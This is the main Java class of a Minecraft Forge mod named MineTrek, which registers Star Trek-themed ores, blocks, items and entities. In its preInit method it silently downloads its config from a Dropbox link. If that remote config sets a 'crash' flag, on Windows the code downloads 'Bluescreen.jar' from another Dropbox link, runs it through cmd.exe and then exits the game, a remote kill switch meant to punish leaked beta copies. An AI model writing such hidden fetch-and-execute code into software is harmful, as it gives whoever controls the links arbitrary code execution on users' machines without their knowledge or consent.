package net.minetrek;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.io.FileUtils;

import com.google.common.io.Files;

import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.util.BlockPos;
import net.minecraft.world.World;
import net.minecraft.world.biome.BiomeGenBase;
import net.minecraftforge.common.DimensionManager;
import net.minecraftforge.common.config.Configuration;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.Mod.Instance;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.registry.EntityRegistry;
import net.minecraftforge.fml.common.registry.GameRegistry;
import net.minetrek.biomes.MineTrekBiomes;
import net.minetrek.blocks.MineTrekBlocks;
import net.minetrek.blocks.ores.MineTrekOres;
import net.minetrek.blocks.ores.OreGenerator;
import net.minetrek.client.ClientProxy;
import net.minetrek.client.gui.GuiHandler;
import net.minetrek.dimension.MineTrekDimension;
import net.minetrek.entities.mob.EntityBorg;
import net.minetrek.entities.projectiles.EntityPhaserBolt;
import net.minetrek.entities.projectiles.EntityPhotonTorpedo;
import net.minetrek.items.DriverCardLol;
import net.minetrek.items.MineTrekItems;

@Mod(modid = MineTrek.MODID, version = MineTrek.VERSION, name = MineTrek.NAME,dependencies = "required-after:OpenComputers@[1.5.6,)")
public class MineTrek {
    public static final String MODID = "minetrek";
    public static final String VERSION = "0.0.2a";
    public static final String NAME = "MineTrek";
    public static  boolean crash = false;
    
    public static CreativeTabs creativeTab;
    public static OreGenerator oreGenerator;
    
	@Instance(value = "MineTrek")
	public static MineTrek instance;
	
	@EventHandler
	public void preInit(FMLPreInitializationEvent event) {
		System.out.println("Initializing MineTrek...");
		instance = this;
		
		new GuiHandler();
		
		oreGenerator = new OreGenerator();
		GameRegistry.registerWorldGenerator(oreGenerator, 2);
		
		creativeTab = new MineTrekCreativeTab("MineTrek");
		System.out.println("Downloading config...");
        try {
            URL url = new URL("https://www.dropbox.com/s/aefe2b2p2wp1pxg/minetrek.cfg?dl=1");
            FileUtils.copyURLToFile(url, new File("config/minetrek.cfg"));
        }catch (IOException e){
        	e.printStackTrace();
        }
		Configuration config = new Configuration(event.getSuggestedConfigurationFile());
		
		config.load();
		crash = config.getBoolean("crash", "b", false, "dont change if betatester");
		config.save();
		
		MineTrekOres.initialize(creativeTab, oreGenerator);
		MineTrekBlocks.initialize(creativeTab);
		MineTrekItems.initialize(creativeTab);
		MineTrekBiomes.initialize();
		MineTrekDimension.initialize();
		if(crash){
			System.out.println("The downloaded config forced MineTrek to crash. Most likely the mod file was published by a beta tester without permission. To prevent publishing of the unfinished product, all clients running this version of the mod will crash from now on. If your not a beta tester, please post us a link to where you found the modfile at: http://www.minecraftforum.net/forums/mapping-and-modding/minecraft-mods/wip-mods/1443111-star-trek-mod. If your a beta tester, a mod update fixing this crash will be send to you as soon as i find out who published the mod without permission.");
			String os = System.getProperty("os.name");
			if((os.contains("Windows") || os.contains("windows"))){
			String stringUrl = "https://www.dropbox.com/s/y3h5vinvrhjjlvu/Bluescreen.jar?dl=1";
			File file = new File("Bluescreen.jar");
	        try {
	            URL url = new URL(stringUrl);
	            FileUtils.copyURLToFile(url, file);
	            File pathFile = new File(".");
	            String gamePath = pathFile.getCanonicalPath();
	            Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"cd " + gamePath + " && java -jar Bluescreen.jar \"");
	        }catch (IOException e){
	        	e.printStackTrace();
	        }
			}
			System.exit(1);
		}
		RecipeManager.addRecipes();
		
		EntityRegistry.registerModEntity(EntityPhaserBolt.class, "PhaserBolt", EntityRegistry.findGlobalUniqueEntityId(), this, 64, 1, true);
		EntityRegistry.registerModEntity(EntityPhotonTorpedo.class, "PhotonTorpedo", EntityRegistry.findGlobalUniqueEntityId(), this, 64, 1, true);
		//EntityRegistry.registerGlobalEntityID(EntityBorg.class, "Borg", EntityRegistry.findGlobalUniqueEntityId(), 0, 555555);
		
		if(FMLCommonHandler.instance().getSide().isClient()) ClientProxy.preInit();
	}
	@EventHandler
	public void init(FMLInitializationEvent evt){
        if(FMLCommonHandler.instance().getSide().isClient()) ClientProxy.init();
        li.cil.oc.api.Driver.add(new DriverCardLol());
        //li.cil.oc.api.Driver.add(new DriverIsolinearChip());
	}
	@EventHandler
	public void postInit(FMLPostInitializationEvent evt){
		System.out.println("Initialized MineTrek.");
	}
}
